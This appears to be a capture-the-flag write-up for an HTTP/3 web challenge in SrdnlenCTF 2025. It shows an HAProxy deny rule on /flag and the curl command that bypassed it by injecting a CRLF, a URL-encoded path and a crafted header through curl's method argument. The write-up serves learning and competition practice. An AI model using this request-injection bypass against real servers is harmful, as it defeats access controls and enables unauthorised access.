## 📝 Challenge Information
>HTTP/3 is just the best version of HTTP, wait a few years, until setting up an HTTP/3 server will not be a pain, and you’ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer.  NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you’ll have to use explicit arguments to do so.  In chrome you can do the following:  
>chrome --enable-quic --origin-to-force-quic-on=enjoyer.challs.ctf.srdnlen.it

# 🔍 Initial Analysis

## First Steps
> After an initial analysis and some research, I tried making a request with `curl` using the `--http3` option:
>
> ```bash
> curl --http3 https://enjoyer.challs.ctf.srdnlen.it
> ```
> Since the site was not reachable without `HTTP/3` support, I proceeded to access the `/flag` route using `curl`:
> 
> ```bash
> curl --http3 https://enjoyer.challs.ctf.srdnlen.it/flag
> ```
> Receiving a response with a `403 Unauthorized` error:
> 
> ![Forbidden](/images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png "Forbidden")
> 
> Then I noticed that this was being blocked through the server's `proxy rules`:
> 
> ```
>  acl restricted_flag path_sub,url_dec -m sub -i i /flag
>  http-request deny if restricted_flag
> ```
> 
> Through an `HAProxy` proxy. So I started doing some research online to find an effective `bypass` for this proxy rule.


## 🔬 Vulnerability Analysis
### Potential Vulnerabilities
>- [x] 403 Bypass
>- [x] Proxy Rule Bypass

# 🎯 Solution Path

## Exploitation Steps
### Initial setup
> After searching online, as mentioned earlier, I found the page on [StackOvreflow](https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066), from which I figured out how to craft the exploit. The trick was to `URL-encode` the slash (`/`) in a special syntax, but I also tried using the `--path-as-is` option in curl, but it didn't work. After that, I needed to craft any `header` to bypass the rule.
>
### Exploitation
> With the following exploit, I was able to obtain the flag:
>
> ```bash
>   echo "\n"; curl --insecure -X "$(echo -en 'GET %2fflag 1/\r\nX-Ignore-Injection:')" https://enjoyer.challs.ctf.srdnlen.it --http3
>```
>
### Flag capture
>  
>   ![Manual Flag](/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png "Manual Flag")

# 🛠️ Exploitation Process
## Approach
> I wasn't able to write the automatic exploit in Python due to issues with `HTTP/3`. I also tried using `httpx`, but it didn't work. I even attempted using `bash script`, but without success.

# 💡 Key Learnings
## New Knowledge
>
> I learned about HTTP Request Smuggling and Header Smuggling from this challenge, but in the end, it was a bypass of the proxy rules through encoding with the addition of a crafted header field.
